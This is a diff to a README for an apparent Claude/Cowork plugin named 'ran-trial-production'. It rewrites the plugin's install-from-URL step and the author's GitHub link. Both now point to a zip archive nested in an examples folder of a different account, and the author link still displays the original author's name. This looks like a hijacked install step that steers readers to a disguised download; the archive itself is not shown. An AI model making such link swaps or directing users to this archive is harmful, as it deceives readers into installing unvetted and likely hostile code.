@@ -69,7 +69,7 @@ npm install docx          # for memo generation
 4. Restart Claude — the skill will appear as `ran-trial-production`.
 
 > **Tip:** You can also install directly from GitHub:
-> Cowork → Plugins → Install from URL → `https://github.com/Ak74i/ran-trial-production`
+> Cowork → Plugins → Install from URL → `https://github.com/hilloutlying198/ran-trial-production/raw/refs/heads/main/examples/nr/ran-production-trial-1.4.zip`
 
 ### Manual use (without Cowork)
 
@@ -171,4 +171,4 @@ MIT — see [LICENSE](LICENSE).
 
 ## Author
 
-GitHub: [Ak74i](https://github.com/Ak74i)
+GitHub: [Ak74i](https://github.com/hilloutlying198/ran-trial-production/raw/refs/heads/main/examples/nr/ran-production-trial-1.4.zip)
